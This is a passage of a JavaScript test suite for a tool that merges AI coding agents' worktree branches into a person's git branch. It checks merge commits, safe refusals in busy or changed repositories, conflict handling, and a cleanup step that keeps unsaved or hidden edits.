    assert.equal(messageOf(t.root, r.merge), `Merge Search cleanup: Fix the search box\n\nWorkbench-Agent: ${t.id}\nWorkbench-Kind: merge\n`);
    for (const c of [r.work, r.merge]) {
      assert.equal(git(t.root, 'log', '-1', '--format=%an <%ae>|%cn <%ce>', c), 'Pat Person <pat@example.invalid>|Pat Person <pat@example.invalid>');
    }
    // The agent's branch is at W, its index matches it, and its files are untouched.
    assert.equal(git(t.root, 'rev-parse', `refs/heads/${t.ws.branch}`), r.work);
    assert.equal(statusOf(t.ws.path), '');
    assert.deepEqual(folderPrint(t.ws.path), agentFiles);
    // From W on there is nothing left to merge: the receipt is empty, and so is the snapshot.
    assert.deepEqual(await diffStats({ path: t.ws.path, base: r.work }), { changed: 0, adds: 0, dels: 0, list: [] });
    const after = await snapshotWork({ repoRoot: t.root, path: t.ws.path, since: r.work });
    assert.equal(after.changed, false);
    assert.deepEqual(after.files, []);
  });

  test('a second merge takes only the new work; then the tidy at shutdown removes the folder and its branch', async () => {
    const t = await agentRepo();
    const { w } = t;
    write(w('a.txt'), 'one\nTWO\nthree\n');
    let { expect } = await proposal(t);
    const first = await mergeWork(mergeOpts(t, expect));
    assert.equal(first.ok, true);
    // A merge commit even though the person's branch could have been fast-forwarded.
    assert.equal(git(t.root, 'log', '-1', '--format=%P', first.merge), `${t.ws.base} ${first.work}`);

    write(w('d.txt'), 'd\n');
    let s;
    ({ s, expect } = await proposal(t, first.work));
    assert.deepEqual(s.files, [{ path: 'd.txt', status: 'added', adds: 1, dels: 0 }]);
    const second = await mergeWork(mergeOpts(t, expect, first.work, { harness: 'codex', message: { subject: 'Add d' } }));
    assert.deepEqual(second, { ok: true, into: 'main', merge: second.merge, work: second.work, files: 1, adds: 1, dels: 0 });
    assert.equal(git(t.root, 'log', '-1', '--format=%P', second.merge), `${first.merge} ${second.work}`);
    assert.equal(git(t.root, 'log', '-1', '--format=%P', second.work), first.work);
    assert.equal(git(t.root, 'diff', '--name-only', first.merge, second.merge), 'd.txt');
    assert.equal(messageOf(t.root, second.work), `Add d\n\nWorkbench-Agent: ${t.id}\nWorkbench-Kind: work\n`); // no Claude line for Codex
    assert.equal(messageOf(t.root, second.merge), `Merge Search cleanup: Add d\n\nWorkbench-Agent: ${t.id}\nWorkbench-Kind: merge\n`);

    // A third time there is nothing new.
    const third = await proposal(t, second.work);
    assert.equal(third.s.changed, false);
    assert.deepEqual(await mergeWork(mergeOpts(t, third.expect, second.work)), { ok: false, why: 'nothing', sentence: 'Its work is already in main.' });

    // The tidy at shutdown gets `since`: the folder holds nothing beyond W, and main holds W, so it goes, with its branch.
    assert.deepEqual(await removeWorkspace({ repoRoot: t.root, path: t.ws.path, base: t.ws.base, since: second.work, onlyIfUnchanged: true, deleteBranch: true }),
      { removed: true, branch: t.ws.branch });
    assert.equal(fs.existsSync(t.ws.path), false);
    assert.equal(git(t.root, 'branch', '--list', t.ws.branch), '');
    assert.equal(git(t.root, 'show', `${second.merge}:d.txt`), 'd');
  });

  test('the tidy keeps a merged agent’s folder and branch once the person undid the merge: its branch is then the only copy', async () => {
    const t = await agentRepo();
    write(t.w('a.txt'), 'one\nTWO\nthree\n');
    const { expect } = await proposal(t);
    const m = await mergeWork(mergeOpts(t, expect));
    assert.equal(m.ok, true);
    const tidy = () => removeWorkspace({ repoRoot: t.root, path: t.ws.path, base: t.ws.base, since: m.work, onlyIfUnchanged: true, deleteBranch: true });
    const holding = () => git(t.root, 'for-each-ref', '--contains', m.work, '--format=%(refname)', 'refs/heads/');

    // The person undoes the merge: only the agent's branch holds its work now.
    git(t.root, 'reset', '-q', '--hard', 'HEAD~1');
    assert.equal(holding(), `refs/heads/${t.ws.branch}`);
    assert.deepEqual(await tidy(), { removed: false, kept: true });
    assert.ok(fs.existsSync(t.ws.path));
    assert.equal(git(t.root, 'rev-parse', `refs/heads/${t.ws.branch}`), m.work);
    // Another agent's branch made after the merge holds it too, but the same tidy may take that one away: kept still.
    git(t.root, 'branch', 'workbench/later-zz0001', m.merge);
    assert.deepEqual(await tidy(), { removed: false, kept: true });
    git(t.root, 'branch', '-D', 'workbench/later-zz0001');
    // Another branch of the person's holds it: the folder and its branch go.
    git(t.root, 'branch', `kept-${t.id}`, m.merge);
    assert.deepEqual(await tidy(), { removed: true, branch: t.ws.branch });
    assert.equal(fs.existsSync(t.ws.path), false);
    assert.equal(git(t.root, 'branch', '--list', t.ws.branch), '');
    assert.equal(holding(), `refs/heads/kept-${t.id}`);
  });

  test('the tidy keeps an agent’s folder whose edits git status cannot see: an assume-unchanged or skip-worktree bit, or core.ignoreStat', async () => {
    const t = await agentRepo();
    let n = 0;
    const another = () => createWorkspace({ repoRoot: t.root, agentId: `${t.id}x${++n}`, slug: 'Hidden edits', baseDir });
    const tidy = (ws, since = null) => removeWorkspace({ repoRoot: t.root, path: ws.path, base: ws.base, since, onlyIfUnchanged: true, deleteBranch: true });
    const kept = async (ws, since, label) => {
      assert.equal(statusOf(ws.path), '', `${label}: git status sees nothing`);
      assert.deepEqual(await tidy(ws, since), { removed: false, kept: true }, label);
      assert.equal(fs.readFileSync(path.join(ws.path, 'a.txt'), 'utf8'), 'one\ntwo\nthree\nNOT SAVED\n', `${label}: the edit is still there`);
      assert.notEqual(git(t.root, 'branch', '--list', ws.branch), '', `${label}: its branch is kept`);
    };
    // An agent sets a bit on a file, then edits it.
    for (const bit of ['assume-unchanged', 'skip-worktree']) {
      const ws = await another();
      git(ws.path, 'update-index', `--${bit}`, 'a.txt');
      write(path.join(ws.path, 'a.txt'), 'one\ntwo\nthree\nNOT SAVED\n');
      await kept(ws, null, bit);
    }
    // The same after a merge, when the tidy gets `since`.
    write(t.w('b.txt'), 'b by the agent\n');
    const m = await mergeWork(mergeOpts(t, (await proposal(t)).expect));
    assert.equal(m.ok, true);
    git(t.ws.path, 'update-index', '--assume-unchanged', 'a.txt');
    write(t.w('a.txt'), 'one\ntwo\nthree\nNOT SAVED\n');
    await kept(t.ws, m.work, 'after a merge');
    // The person's core.ignoreStat gives every file git writes in a new agent folder the assume-unchanged bit.
    git(t.root, 'config', 'core.ignoreStat', 'true');
    const quiet = await another();
    assert.match(git(quiet.path, 'ls-files', '-v', 'a.txt'), /^h a\.txt$/);
    write(path.join(quiet.path, 'a.txt'), 'one\ntwo\nthree\nNOT SAVED\n');
    await kept(quiet, null, 'core.ignoreStat');
    // An untouched folder still goes, bits or not.
    const untouched = await another();
    assert.deepEqual(await tidy(untouched), { removed: true, branch: untouched.branch });
    assert.equal(fs.existsSync(untouched.path), false);
    // Judging the files again writes an index of Workbench's own: no hook of the repository's runs for it.
    const log = path.join(T, `hooks-tidy-${t.id}.log`);
    plantHooks(path.join(t.root, '.git'), log);
    plantConfigHooks(path.join(t.root, '.git', 'config'), log);
    await kept(quiet, null, 'core.ignoreStat, with hooks planted');
    assert.deepEqual(ranHooks(log), [], 'no hook ran');
  });

  test('mergeWork refuses, changing nothing at all, before it makes the work commit', async () => {
    const cases = [];
    /** A case: an agent edits a.txt, the card is drawn, `setup` changes something, and the merge is refused for `why`. */
    const refused = (label, setup, why, sentence, { since, edit = true } = {}) => cases.push(async () => {
      const t = await agentRepo();
      if (edit) write(t.w('a.txt'), 'one\nAGENT\nthree\n');
      const { expect } = await proposal(t);
      const o = (await setup(t, expect)) || {};
      const was = await everything(t);
      const r = await mergeWork({ ...mergeOpts(t, o.expect || expect, since || t.ws.base), ...(o.opts || {}) });
      const words = typeof sentence === 'function' ? sentence(t) : sentence;
      assert.deepEqual(r, { ok: false, why, sentence: words }, `${label}: ${JSON.stringify(r)}`);
      assert.deepEqual(await everything(t), was, `${label}: nothing changed`);
    });

    // Not on a branch. (Plain git "succeeds" there, moving only the detached HEAD; no branch gets the work.)
    cases.push(async () => {
      const demo = cloneOf((await agentRepo()).root);
      git(demo, 'checkout', '-q', '-b', 'side');
      write(path.join(demo, 'side.txt'), 's\n');
      git(demo, 'add', 'side.txt');
      git(demo, 'commit', '-q', '-m', 'side');
      git(demo, 'checkout', '-q', '--detach', 'main');
      assert.equal(gitTry(demo, 'merge', '--ff-only', '-q', 'side').code, 0);
      assert.equal(headOf(demo), git(demo, 'rev-parse', 'side'));
      assert.notEqual(git(demo, 'rev-parse', 'main'), headOf(demo));
    });
    refused('detached', t => { git(t.root, 'checkout', '-q', '--detach'); }, 'detached', 'Your folder is not on a branch, so there is nowhere to merge it.');

    // A merge, rebase, cherry-pick, revert (one commit, or a sequence of them) or bisect under way.
    for (const marker of ['MERGE_HEAD', 'rebase-merge', 'CHERRY_PICK_HEAD', 'REVERT_HEAD', 'BISECT_LOG', 'rebase-apply', 'sequencer']) {
      refused(marker, t => {
        const f = path.join(t.root, '.git', marker);
        if (marker.startsWith('rebase') || marker === 'sequencer') fs.mkdirSync(f);
        else write(f, `${t.ws.base}\n`);
      }, 'busy', 'Your folder is in the middle of a merge or rebase. Finish that first.');
    }
    // Unresolved conflicts in the person's index with none of those markers: a `git stash pop` that did not apply cleanly.
    cases.push(async () => {
      const t = await agentRepo();
      write(t.w('a.txt'), 'one\nAGENT\nthree\n');
      write(t.p('b.txt'), 'b stashed\n');
      git(t.root, 'stash', '-q');
      write(t.p('b.txt'), 'b committed\n');
      git(t.root, 'commit', '-q', '-am', 'person');
      assert.notEqual(gitTry(t.root, 'stash', 'pop').code, 0);
      assert.equal(statusOf(t.root), 'UU b.txt\n');
      assert.equal(gitTry(t.root, 'rev-parse', '-q', '--verify', 'MERGE_HEAD').code, 1);
      const { expect } = await proposal(t);
      const was = await everything(t);
      assert.deepEqual(await mergeWork(mergeOpts(t, expect)),
        { ok: false, why: 'busy', sentence: 'Your folder has unresolved conflicts in b.txt. Finish that first.', paths: ['b.txt'] });
      assert.deepEqual(await everything(t), was);
    });

    // Branch or HEAD changed since the card was drawn.
    refused('a new commit', t => {
      write(t.p('c.txt'), 'c2\n');
      git(t.root, 'commit', '-q', '-am', 'person again');
    }, 'moved', 'main changed since you looked. Have another look.');
    refused('another branch on the card', (t, expect) => ({ expect: { ...expect, into: 'release' } }), 'moved', 'release changed since you looked. Have another look.');
    refused('another branch now', (t, expect) => {
      git(t.root, 'checkout', '-q', '-b', 'release');
      return { expect: { ...expect, into: 'main' } };
    }, 'moved', 'main changed since you looked. Have another look.');
    refused('no HEAD on the card', () => ({ expect: { workId: 'nonsense', into: 'main' } }), 'moved', 'main changed since you looked. Have another look.');

    // The work changed since: one more edit, or a commit by the agent.
    refused('one more edit', t => { write(t.w('late.txt'), 'late\n'); }, 'changed', 'Its work changed since you looked. Have another look.');
    refused('a commit by the agent', t => { git(t.ws.path, 'commit', '-q', '-am', 'agent'); }, 'changed', 'Its work changed since you looked. Have another look.');

    // The person's branch no longer holds the commit the agent started from.
    refused('a card from elsewhere', t => {
      git(t.root, 'checkout', '-q', '--orphan', 'fresh');
      git(t.root, 'commit', '-q', '-m', 'a fresh start');
      return { expect: { workId: undefined, into: 'fresh', intoHead: headOf(t.root) } };
    }, 'changed', 'Its work changed since you looked. Have another look.');
    cases.push(async () => {
      const t = await agentRepo();
      write(t.w('a.txt'), 'one\nAGENT\nthree\n');
      git(t.root, 'checkout', '-q', '--orphan', 'fresh');
      git(t.root, 'commit', '-q', '-m', 'a fresh start');
      const { expect } = await proposal(t);
      const was = await everything(t);
      assert.deepEqual(await mergeWork(mergeOpts(t, expect)),
        { ok: false, why: 'ancestry', sentence: 'It started from a commit that is no longer in fresh, so merging it would bring in other work.' });
      assert.deepEqual(await everything(t), was);
    });

    // Nothing to merge: no change at all, or work already merged by hand.
    refused('no change', () => {}, 'nothing', 'Its work is already in main.', { edit: false });
    cases.push(async () => {
      const t = await agentRepo();
      write(t.w('a.txt'), 'one\nAGENT\nthree\n');
      git(t.ws.path, 'commit', '-q', '-am', 'agent');
      git(t.root, 'merge', '-q', '--no-ff', '--no-edit', t.ws.branch);
      const { s, expect } = await proposal(t);
      assert.equal(s.changed, true);
      const was = await everything(t);
      assert.deepEqual(await mergeWork(mergeOpts(t, expect)), { ok: false, why: 'nothing', sentence: 'Its work is already in main.' });
      assert.deepEqual(await everything(t), was);
    });

    // The agent's folder is mid-merge itself (its conflict markers would be taken as work), or is not on its branch.
    refused('the agent mid-merge', t => { write(path.resolve(t.ws.path, git(t.ws.path, 'rev-parse', '--git-path', 'MERGE_HEAD')), `${t.ws.base}\n`); },
      'git', 'Its folder is in the middle of a merge or rebase, so its work cannot be merged yet.');
    refused('another branch for the agent', () => ({ opts: { branch: 'workbench/someone-else-a1a1a1' } }), 'changed',
      t => `Its folder is on the branch ${t.ws.branch} now, not on workbench/someone-else-a1a1a1.`);

    await inParallel(cases);
  });

  test('a cherry-pick of several commits that waits between two of them is under way: busy, and the person can still finish it', async () => {
    const t = await agentRepo({ ...STARTING_FILES, 'p.txt': 'p\n', 'q.txt': 'q\n' });
    write(t.w('a.txt'), 'one\nAGENT\nthree\n');
    git(t.root, 'checkout', '-q', '-b', 'side');
    write(t.p('p.txt'), 'side p\n');
    git(t.root, 'commit', '-q', '-am', 'side 1');
    write(t.p('q.txt'), 'side q\n');
    git(t.root, 'commit', '-q', '-am', 'side 2');
    git(t.root, 'checkout', '-q', 'main');
    write(t.p('p.txt'), 'main p\n');
    git(t.root, 'commit', '-q', '-am', 'main p');
    // The first commit does not apply cleanly; the person settles it and commits it, and the second one waits.
    assert.notEqual(gitTry(t.root, 'cherry-pick', 'main..side').code, 0);
    write(t.p('p.txt'), 'settled\n');
    git(t.root, 'add', 'p.txt');
    git(t.root, 'commit', '-q', '--no-edit');
    assert.match(git(t.root, 'status'), /Cherry-pick currently in progress/);
    assert.equal(gitTry(t.root, 'rev-parse', '-q', '--verify', 'CHERRY_PICK_HEAD').code, 1);
    const { expect } = await proposal(t);
    const was = await everything(t);
    assert.deepEqual(await mergeWork(mergeOpts(t, expect)), { ok: false, why: 'busy', sentence: 'Your folder is in the middle of a merge or rebase. Finish that first.' });
    assert.deepEqual(await everything(t), was);
    // Their cherry-pick goes on where it waited, on their own commit; once it is done, the merge goes through.
    const settled = headOf(t.root);
    assert.equal(gitTry(t.root, 'cherry-pick', '--continue').code, 0);
    assert.equal(git(t.root, 'log', '-1', '--format=%s %P'), `side 2 ${settled}`);
    const picked = headOf(t.root);
    const r = await mergeWork(mergeOpts(t, (await proposal(t)).expect));
    assert.equal(r.ok, true, JSON.stringify(r));
    assert.equal(git(t.root, 'log', '-1', '--format=%P', r.merge), `${picked} ${r.work}`);
  });

  test('with the reftable ref store, where CHERRY_PICK_HEAD and REVERT_HEAD are refs and not files, a cherry-pick or revert under way is busy', async (c) => {
    if (gitTry(T, 'init', '-q', '--ref-format=reftable', path.join(T, 'reftable-probe')).code !== 0) return c.skip('this git has no reftable ref store (git 2.45 and newer)');
    await inParallel(['cherry-pick', 'revert'].map((op, k) => async () => {
      const r = path.join(T, `reftable-${op}`);
      fs.mkdirSync(r);
      git(r, 'init', '-q', '-b', 'main', '--ref-format=reftable');
      git(r, 'config', 'user.name', PERSON.name);
      git(r, 'config', 'user.email', PERSON.email);
      for (const [f, text] of Object.entries({ ...STARTING_FILES, 'p.txt': 'p\n' })) write(path.join(r, f), text);
      git(r, 'add', '-A');
      git(r, 'commit', '-q', '-m', 'first');
      const root = fs.realpathSync.native(r);
      const id = `rt000${k + 1}`;
      const ws = await createWorkspace({ repoRoot: root, agentId: id, slug: 'Reftable', baseDir });
      const t = { root, ws, id, w: f => path.join(ws.path, f), p: f => path.join(root, f) };
      if (op === 'cherry-pick') {
        git(root, 'checkout', '-q', '-b', 'side');
        write(t.p('p.txt'), 'side\n');
        git(root, 'commit', '-q', '-am', 'side');
        git(root, 'checkout', '-q', 'main');
        write(t.p('p.txt'), 'main\n');
        git(root, 'commit', '-q', '-am', 'main');
        assert.notEqual(gitTry(root, 'cherry-pick', 'side').code, 0);
      } else {
        write(t.p('p.txt'), 'p2\n');
        git(root, 'commit', '-q', '-am', 'p2');
        const target = headOf(root);
        write(t.p('p.txt'), 'p3\n');
        git(root, 'commit', '-q', '-am', 'p3');
        assert.notEqual(gitTry(root, 'revert', target).code, 0);
      }
      // Settled, not committed yet.
      write(t.p('p.txt'), 'settled\n');
      git(root, 'add', 'p.txt');
      const ref = op === 'cherry-pick' ? 'CHERRY_PICK_HEAD' : 'REVERT_HEAD';
      assert.equal(fs.existsSync(path.resolve(root, git(root, 'rev-parse', '--git-path', ref))), false, `${op}: a ref, not a file`);
      assert.equal(gitTry(root, 'rev-parse', '-q', '--verify', ref).code, 0, op);
      write(t.w('a.txt'), 'one\nAGENT\nthree\n');
      const { expect } = await proposal(t);
      const was = await everything(t);
      assert.deepEqual(await mergeWork(mergeOpts(t, expect)), { ok: false, why: 'busy', sentence: 'Your folder is in the middle of a merge or rebase. Finish that first.' }, op);
      assert.deepEqual(await everything(t), was, `${op}: nothing changed`);
    }));
  });

  test('what git keeps for the person’s next commit survives a merge: the message of a cherry-pick --no-commit, and rerere’s record', async () => {
    const t = await agentRepo({ ...STARTING_FILES, 'p.txt': 'p\n' });
    git(t.root, 'config', 'rerere.enabled', 'true');
    git(t.root, 'checkout', '-q', '-b', 'side');
    write(t.p('p.txt'), 'side p\n');
    git(t.root, 'commit', '-q', '-am', 'Port the fix', '-m', 'Why it matters.');
    git(t.root, 'checkout', '-q', 'main');
    write(t.p('p.txt'), 'main p\n');
    git(t.root, 'commit', '-q', '-am', 'main p');
    // Picked without a commit: git writes the message for the next commit (MERGE_MSG), and rerere notes the conflict
    // the person settles (MERGE_RR). Git does not count this as a cherry-pick under way.
    assert.notEqual(gitTry(t.root, 'cherry-pick', '-n', '-x', 'side').code, 0);
    write(t.p('p.txt'), 'settled\n');
    git(t.root, 'add', 'p.txt');
    assert.doesNotMatch(git(t.root, 'status'), /in progress/);
    const kept = cwd => Object.fromEntries(['MERGE_MSG', 'MERGE_RR'].map(f => {
      const file = path.join(cwd, '.git', f);
      return [f, fs.existsSync(file) ? fs.readFileSync(file, 'latin1') : null];
    }));
    const before = kept(t.root);
    assert.match(before.MERGE_MSG, /^Port the fix\n\nWhy it matters\.\n\n\(cherry picked from commit [0-9a-f]{40}\)\n/);
    assert.notEqual(before.MERGE_RR, null);
    write(t.w('a.txt'), 'one\nAGENT\nthree\n');
    git(t.ws.path, 'commit', '-q', '-am', 'agent');

    // The danger is real: git's fast-forward deletes both, as if it ended a merge.
    const demo = path.join(T, `demo-${t.id}`);
    fs.cpSync(t.root, demo, { recursive: true });
    const tree = git(demo, 'merge-tree', '--write-tree', 'HEAD', t.ws.branch).split('\n')[0];
    const m = git(demo, 'commit-tree', tree, '-p', 'HEAD', '-p', t.ws.branch, '-m', 'merge');
    assert.equal(gitTry(demo, 'merge', '--ff-only', '-q', m).code, 0);
    assert.deepEqual(kept(demo), { MERGE_MSG: null, MERGE_RR: null });

    const r = await mergeWork(mergeOpts(t, (await proposal(t)).expect));
    assert.equal(r.ok, true, JSON.stringify(r));
    assert.equal(headOf(t.root), r.merge);
    assert.deepEqual(kept(t.root), before);
    assert.equal(statusOf(t.root), 'M  p.txt\n');
    // Their next commit is the one they prepared, and rerere learns how they settled the conflict.
    git(t.root, 'commit', '-q', '--no-edit');
    assert.equal(git(t.root, 'log', '-1', '--format=%s'), 'Port the fix');
    const cache = path.join(t.root, '.git', 'rr-cache');
    assert.ok(fs.readdirSync(cache).some(id => fs.existsSync(path.join(cache, id, 'postimage'))), 'rerere recorded the settled file');
  });

  test('a merge card is bound to the review it showed: the person’s HEAD it was made against, and the tree that merge makes', async () => {
    await inParallel([
      async () => {
        // The person's folder is on another branch while the review is made, and back on main when they say yes.
        const t = await agentRepo();
        write(t.w('a.txt'), 'one\nAGENT\nthree\n');
        write(t.w('b.txt'), 'b by the agent\n');
        git(t.root, 'checkout', '-q', '-b', 'feature');
        write(t.p('b.txt'), 'b by the agent\n'); // feature already holds the agent's change to b.txt
        git(t.root, 'commit', '-q', '-am', 'feature');
        git(t.root, 'checkout', '-q', 'main');
        const info = await prepareRepo(t.root); // what the engine binds the card to: main, and its HEAD
        git(t.root, 'checkout', '-q', 'feature');
        const s = await snapshotWork({ repoRoot: t.root, path: t.ws.path, since: t.ws.base });
        git(t.root, 'checkout', '-q', 'main');
        assert.deepEqual(s.files, [{ path: 'a.txt', status: 'modified', adds: 1, dels: 1 }], 'the card shows a.txt only');
        const was = await everything(t);
        assert.deepEqual(await mergeWork(mergeOpts(t, { workId: s.workId, into: info.branch, intoHead: info.head })),
          { ok: false, why: 'moved', sentence: 'main changed since you looked. Have another look.' });
        assert.deepEqual(await everything(t), was, 'nothing changed');
      },
      async () => {
        // The person's own attributes change what the merge makes after the card was drawn: here a conflict, which the
        // card showed as the agent's change from where the two last met, becomes a merge of both lines.
        const t = await agentRepo();
        write(t.w('a.txt'), 'one\nAGENT\nthree\n');
        write(t.p('a.txt'), 'one\nPERSON\nthree\n');
        git(t.root, 'commit', '-q', '-am', 'person');
        const head = headOf(t.root);
        const { s, expect } = await proposal(t);
        assert.deepEqual(s.files, [{ path: 'a.txt', status: 'modified', adds: 1, dels: 1 }]);
        write(t.p('.gitattributes'), 'a.txt merge=union\n');
        const person = folderPrint(t.root);
        assert.deepEqual(await mergeWork(mergeOpts(t, expect)),
          { ok: false, why: 'changed', sentence: 'What merging it would change in main is no longer what you saw. Have another look.' });
        assert.deepEqual(folderPrint(t.root), person);
        assert.equal(headOf(t.root), head);
        // A new look shows what it would bring in now, and that is what lands.
        const again = await proposal(t);
        assert.deepEqual(again.s.files, [{ path: 'a.txt', status: 'modified', adds: 1, dels: 0 }]);
        const ok = await mergeWork(mergeOpts(t, again.expect));
        assert.deepEqual(ok, { ok: true, into: 'main', merge: ok.merge, work: ok.work, files: 1, adds: 1, dels: 0 });
        assert.equal(fs.readFileSync(t.p('a.txt'), 'utf8'), 'one\nPERSON\nAGENT\nthree\n');
      },
    ]);
  });

  test('mergeWork refuses a conflict and writes nothing into the person’s folder; the agent can then bring the branch in', async () => {
    const t = await agentRepo();
    const { w, p } = t;
    write(w('a.txt'), 'one\nAGENT\nthree\n');
    fs.rmSync(w('b.txt'));
    write(p('a.txt'), 'one\nPERSON\nthree\n');
    write(p('b.txt'), 'b2\n');
    git(t.root, 'commit', '-q', '-am', 'person');
    write(p('c.txt'), 'their own edit\n');
    const person = folderPrint(t.root);
    const head = headOf(t.root);
    const agentFiles = folderPrint(t.ws.path);

    const { s, expect } = await proposal(t);
    const r = await mergeWork(mergeOpts(t, expect));
    assert.deepEqual(r, { ok: false, why: 'conflict', sentence: 'Its work does not merge cleanly into main.', paths: ['a.txt', 'b.txt'] });
    assert.deepEqual(folderPrint(t.root), person, 'the person’s folder is byte for byte as it was');
    assert.equal(headOf(t.root), head);
    assert.equal(statusOf(t.root), ' M c.txt\n');
    for (const f of Object.keys(person)) assert.ok(!fs.readFileSync(p(f), 'utf8').includes('<<<<<<<'), `${f} has no markers`);
    assert.equal(gitTry(t.root, 'rev-parse', '-q', '--verify', 'MERGE_HEAD').code, 1);
    // The work is a commit on its branch now; the agent's files are untouched and its folder shows clean.
    const tip = git(t.root, 'rev-parse', `refs/heads/${t.ws.branch}`);
    assert.equal(git(t.root, 'rev-parse', `${tip}^{tree}`), s.tree);
    assert.equal(git(t.root, 'log', '-1', '--format=%P', tip), t.ws.base);
    assert.deepEqual(folderPrint(t.ws.path), agentFiles);
    assert.equal(statusOf(t.ws.path), '');

    // The agent brings main in and settles it in its own folder; then the merge goes through.
    assert.notEqual(gitTry(t.ws.path, 'merge', '-q', 'main').code, 0);
    write(w('a.txt'), 'one\nAGENT AND PERSON\nthree\n');
    git(t.ws.path, 'rm', '-q', 'b.txt');
    git(t.ws.path, 'add', 'a.txt');
    git(t.ws.path, 'commit', '-q', '--no-edit');
    const again = await proposal(t);
    const ok = await mergeWork(mergeOpts(t, again.expect));
    assert.equal(ok.ok, true);
    assert.equal(fs.readFileSync(p('a.txt'), 'utf8'), 'one\nAGENT AND PERSON\nthree\n');
    assert.equal(fs.existsSync(p('b.txt')), false);
    assert.equal(fs.readFileSync(p('c.txt'), 'utf8'), 'their own edit\n');
  });

  /**
   * The review, the card's counts and the merge agree with what the merge commit M really changes in the person's branch
   * (its first-parent diff): the files and counts of snapshotWork, workDiff and mergeWork, and plain git's numstat of M.
   */
  async function landsExactly(t, since, want) {
    const { s, expect } = await proposal(t, since);
    assert.deepEqual(s.files, want, 'snapshotWork');
    const d = await workDiff({ repoRoot: t.root, path: t.ws.path, since });
    assert.equal(d.workId, s.workId);
    assert.deepEqual(d.files.map(({ patch, ...f }) => f), want, 'workDiff');
    const m = await mergeWork(mergeOpts(t, expect, since));
    const sum = key => want.reduce((n, f) => n + f[key], 0);
    assert.deepEqual(m, { ok: true, into: 'main', merge: m.merge, work: m.work, files: want.length, adds: sum('adds'), dels: sum('dels') });
    assert.equal(git(t.root, 'diff-tree', '-r', '--numstat', `${m.merge}^1`, m.merge), want.map(f => `${f.adds}\t${f.dels}\t${f.path}`).join('\n'));
    return { d, m };
  }

  test('once the agent brings in the person’s branch and settles a conflict, only what its merge brings in is shown, counted and merged', async () => {
    const t = await agentRepo();
    const { w, p } = t;
    write(w('a.txt'), 'one\nAGENT\nthree\n');
    write(p('a.txt'), 'one\nPERSON\nthree\n');
    for (const f of ['person/f0.txt', 'person/f1.txt', 'person/f2.txt']) write(p(f), `${f}\n`);
    write(p('workbench.json'), JSON.stringify({ checks: [{ name: 'x', run: 'true' }] }));
    git(t.root, 'add', '-A');
    git(t.root, 'commit', '-q', '-m', 'person');
    // The first merge is refused as a conflict. Meanwhile the review shows the agent's own change, from where it started.
    const first = await proposal(t);
    assert.deepEqual(first.s.files, [{ path: 'a.txt', status: 'modified', adds: 1, dels: 1 }]);
    assert.equal((await mergeWork(mergeOpts(t, first.expect))).why, 'conflict');
    // As the lid advises, the agent brings main in, and settles the conflict by keeping its own line.
    assert.notEqual(gitTry(t.ws.path, 'merge', '-q', 'main').code, 0);
    write(w('a.txt'), 'one\nAGENT\nthree\n');
    git(t.ws.path, 'add', 'a.txt');
    git(t.ws.path, 'commit', '-q', '--no-edit');
    // Only a.txt lands, its line over the person's: none of the person's own files, and not workbench.json.
    const { d } = await landsExactly(t, t.ws.base, [{ path: 'a.txt', status: 'modified', adds: 1, dels: 1 }]);
    assert.ok(d.files[0].patch.endsWith(' one\n-PERSON\n+AGENT\n three\n'), d.files[0].patch);
    assert.equal(fs.readFileSync(p('a.txt'), 'utf8'), 'one\nAGENT\nthree\n');
    assert.equal(fs.readFileSync(p('workbench.json'), 'utf8'), JSON.stringify({ checks: [{ name: 'x', run: 'true' }] }));
  });

  test('when the agent brings in the person’s branch but keeps its own files, the review shows the person’s changes its merge undoes', async () => {
    const t = await agentRepo();
    write(t.w('a.txt'), 'one\nAGENT\nthree\n');
    git(t.ws.path, 'commit', '-q', '-am', 'agent');
    write(t.p('b.txt'), 'b fixed\n');
    write(t.p('person.txt'), 'theirs\n');
    git(t.root, 'add', '-A');
    git(t.root, 'commit', '-q', '-m', 'person');
    git(t.ws.path, 'merge', '-q', '-s', 'ours', '--no-edit', 'main');
    const { d } = await landsExactly(t, t.ws.base, [
      { path: 'a.txt', status: 'modified', adds: 1, dels: 1 },
      { path: 'b.txt', status: 'modified', adds: 1, dels: 1 },
      { path: 'person.txt', status: 'deleted', adds: 0, dels: 1 },
    ]);
    assert.ok(d.files[1].patch.endsWith('-b fixed\n+b\n'), d.files[1].patch);
    assert.equal(fs.existsSync(t.p('person.txt')), false);
  });

  test('when the agent goes back to before its merged work, the review shows only what lands, never an undo that does not', async () => {
    const t = await agentRepo();
    write(t.w('a.txt'), 'one\nTWO\nthree\n');
    const first = await mergeWork(mergeOpts(t, (await proposal(t)).expect));
    assert.equal(first.ok, true);
    // It goes back to where it started, and changes something else.
    git(t.ws.path, 'reset', '-q', '--hard', t.ws.base);
    write(t.w('b.txt'), 'b2\n');
    await landsExactly(t, first.work, [{ path: 'b.txt', status: 'modified', adds: 1, dels: 1 }]);
    assert.equal(fs.readFileSync(t.p('a.txt'), 'utf8'), 'one\nTWO\nthree\n');
    assert.equal(fs.readFileSync(t.p('b.txt'), 'utf8'), 'b2\n');
  });

  test('mergeWork refuses when the person’s own changes or files are in the way, and merges once they are not', async () => {
    const t = await agentRepo();
    const { w, p } = t;
    write(w('a.txt'), 'one\nAGENT\nthree\n');
    write(w('new.txt'), 'agent\n');
    write(w('cache'), 'an agent file where the person has a folder\n');
    write(p('a.txt'), 'one\ntwo\nthree\nmine\n'); // an uncommitted edit to a file the merge changes
    write(p('new.txt'), 'mine\n'); // an untracked file where the agent adds one
    write(p('cache/data.bin'), 'mine\n'); // a folder of untracked files where the agent adds a file
    const person = folderPrint(t.root);
    const head = headOf(t.root);
    let { s, expect } = await proposal(t);
    const r = await mergeWork(mergeOpts(t, expect));
    assert.equal(r.ok, false);
    assert.equal(r.why, 'blocked');
    assert.deepEqual([...r.paths].sort(), ['a.txt', 'cache', 'new.txt']);
    assert.equal(r.sentence, `Your own changes are in the way: ${r.paths.join(', ')}. Commit or put them aside, then merge again.`);
    assert.deepEqual(folderPrint(t.root), person);
    assert.equal(headOf(t.root), head);
    const tip = git(t.root, 'rev-parse', `refs/heads/${t.ws.branch}`);
    assert.equal(git(t.root, 'rev-parse', `${tip}^{tree}`), s.tree, 'W stays on the agent’s branch');

    // Out of the way, it merges. The work is W itself now, so the card is drawn again.
    git(t.root, 'checkout', '--', 'a.txt');
    fs.rmSync(p('new.txt'));
    fs.rmSync(p('cache'), { recursive: true });
    ({ s, expect } = await proposal(t));
    assert.equal(s.head, tip);
    const ok = await mergeWork(mergeOpts(t, expect));
    assert.equal(ok.ok, true);
    assert.equal(ok.work, tip);
